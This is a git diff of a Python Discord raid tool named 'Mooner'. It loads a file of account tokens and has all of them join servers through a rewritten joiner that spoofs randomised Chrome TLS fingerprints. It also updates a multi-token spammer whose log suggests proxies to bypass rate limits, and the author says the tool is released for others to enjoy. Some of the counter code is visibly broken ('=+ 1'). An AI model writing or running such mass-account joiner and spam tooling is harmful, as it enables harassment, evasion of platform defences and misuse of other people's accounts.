@@ -5,10 +5,7 @@ import os
 import colorama
 import webbrowser
 import logging
-import random
-import websocket
-import json
-import base64
+import ctypes
 from pystyle import Write, Colors
 from colorama import Fore
 
@@ -90,13 +87,17 @@ logging.basicConfig(
     format="[%(asctime)s] %(levelname)s: %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S"
 )
-
-# auto token checker for cmd tiltle
+msg_sent = 0
+msg_failed = 0
+msg_ratelimited = 0
 def main_program():
     while True:            
         # Cleaning ocnsole
         os.system('cls')
         logging.info("console was cleared")
+        
+        def title():
+            ctypes.windll.kernel32.SetConsoleTitleW(f"Mooner | Sent ~ {msg_sent} | Failed ~ {msg_failed} | Ratelimited ~ {msg_ratelimited} | Made by _r3ci_")
         
         # Counting tokens
         def count_lines(file_path):
@@ -163,68 +164,93 @@ def main_program():
             else:
                 print ("no such option")
                 logging.info("put in a option that doesnt exist (socials)")
-            
-        # Joiner
-        if choice == 1:
-            logging.info("chose joiner (1)")
-            with open(file_path_tokens, "r") as file:
-                tokens = file.read().splitlines()
-
-            invite = Write.Input(f"Invite: ", Colors.blue_to_purple, interval=0.000)
-            logging.info("put in invite (joiner)")
-            
-            def joiner(token, session):
-                headers = {'accept':  '*/*'}
-                headers = {'accept-language': 'pl-PL, pl;q=0.9'}
-                headers = {'cache-control': 'no-cache'}
-                headers = {'authorization': token}
-                headers = {'content-type': 'application/json'}
-                headers = {'origin': 'https://discord.com'}
-                headers = {'cookie': '__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US'}
-                headers = {'pragma': 'no-cache'}
-                headers = {'referer': 'https://discord.com/channels/@me'}  
-                headers = {'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"'}
-                headers = {'sec-ch-ua-mobile': '?0'}
-                headers = {'sec-ch-ua-platform': '"Windows"'}
-                headers = {'sec-fetch-dest': 'empty'}
-                headers = {'sec-fetch-mode': 'cors'}
-                headers = {'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
-                headers = { 'x-debug-options': 'bugReporterEnabled'}
-                headers = {'sec-fetch-site': 'same-origin'}
-                headers = {'x-discord-locale': 'en-US'}
-                headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
-                payload = {'session_id': session}
-
-                response = requests.post(f"https://discord.com/api/v9/invites/{invite}", json=payload, headers=headers)
-
-                if response.status_code == 200:
-                    print(Succes, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner succes")
-                elif response.status_code == 401:
-                    print(Invalid, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner invalid token")
-                elif response.status_code == 403:
-                    print(Locked, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner locked token")
-                elif response.status_code == 429:
-                    print(Invalid, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner invalid token")
-                elif response.status_code == 40007:
-                    print(Banned, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner banned token")
-                else:
-                    print(Invalid, purple_light + token[:-5] + "*****", yellow, response)
-                    logging.info("Joiner invalid token")
-
-            threads = []
-            for token in tokens:
-                thread = threading.Thread(target=joiner, args=(token,))
-                thread.start()
-                threads.append(thread)
                 
-            for thread in threads:
-                thread.join()
+            
+        elif choice == 1:
+            # Skidded joiner why? Ended the project and i just want yall to enjoy it
+            import concurrent.futures
+            import random
+            import string
+            import tls_client
+            from colorama import Fore, Style
+            import dtypes
 
+
+            class Joiner:
+                def __init__(self, data: dtypes.Instance) -> None:
+                    self.session = data.client
+                    self.session.headers = data.headers
+                    self.get_cookies()
+                    self.instance = data
+
+                def rand_str(self, length: int) -> str:
+                    return ''.join(random.sample(string.ascii_lowercase + string.digits, length))
+
+                def get_cookies(self) -> None:
+                    site = self.session.get("https://discord.com")
+                    self.session.cookies = site.cookies
+
+                def join(self) -> None:
+                    self.session.headers.update({"Authorization": self.instance.token})
+                    result = self.session.post(f"https://discord.com/api/v9/invites/{self.instance.invite}", json={
+                        'session_id': self.rand_str(32),
+                    })
+
+                    if result.status_code == 200:
+                       Write.Print(f'Joined server: {result.status_code}', Colors.blue_to_purple, interval=0.000)
+
+                    else:
+                        Write.Print(f'Error: {result.status_code}', Colors.blue_to_purple, interval=0.000)
+
+            class logger:
+                colors_table = dtypes.OtherInfo.colortable
+
+                @staticmethod
+                def printk(text) -> None:
+                    print(f"{text}")
+
+                @staticmethod
+                def convert(color):
+                    return color if color.__contains__("#") else logger.colors_table[color]
+
+                @staticmethod
+                def color(opt, obj):
+                    return f"{logger.convert(opt)}{obj}{Style.RESET_ALL}"
+
+            class intilize:
+                @staticmethod
+                def start(i):
+                    Joiner(i).join()
+
+            if __name__ == '__main__':
+                with open("data/tokens.txt") as file:
+                    tokens = [line.strip() for line in file]
+
+                instances = []
+                max_threads = 5
+                invite = input("Discord invite: ")
+                invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "")
+                invite_parts = invite.split("/")
+
+                for token_ in tokens:
+                    header = dtypes.OtherInfo.headers
+                    instances.append(
+                        dtypes.Instance(
+                            client=tls_client.Session(
+                                client_identifier=f"chrome_{random.randint(110, 115)}",
+                                random_tls_extension_order=True,
+                            ),
+                            token=token_,
+                            headers=header,
+                            invite=invite,
+                        )
+                    )
+
+                with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+                    for i in instances:
+                        executor.submit(intilize.start, i)
+        
+        
         # LEAVER
         elif choice == 2:
             logging.info("chose leaver (2)")
@@ -265,6 +291,7 @@ def main_program():
 
         # SPAMMER
         elif choice == 3:
+            global msg_sent
             logging.info("chose spammer (3)")
             with open(file_path_tokens, "r") as file:
                 tokens = file.read().splitlines()
@@ -286,15 +313,23 @@ def main_program():
                     if response.status_code == 200:
                         print(Succes, purple_light + token[:-5] + "*****", yellow, response)
                         logging.info("spammer succes")
+                        msg_sent =+ 1
+                        title()
                     elif response.status_code == 401:
                         print(Invalid, purple_light + token[:-5] + "*****", yellow, response)
                         logging.info("spammer invalid token")
+                        msg_failed =+ 1
+                        title()
                     elif response.status_code == 429:
                         print(RateLimit, purple_light + token[:-5] + "*****", yellow, response)
                         logging.info("spammer ratelimit (use proxies to bypass)")
+                        msg_ratelimited =+ 1
+                        title()
                     elif response.status_code == 403:
                         print(Invalid, "/", Banned, purple_light + token[:-5] + "*****", yellow, response)
                         logging.info("spammer invalid or banned token")
+                        msg_failed =+ 1
+                        title()
                     else:
                         print("Unknown Error", purple_light + token[:-5] + "*****", yellow, response)
                         logging.info("spammer unknown error")
@@ -498,7 +533,7 @@ def main_program():
                 
         elif choice == 10:
             logging.info("exited (10)")
-            break
+            exit()
         elif choice == 100:
             logging.info("entered the TEST SPACE")
             Write.Print("This is a testing space for me (R3CI) wired stuff can be here so I recommend re-opening",Colors.blue_to_purple, interval=0.000)
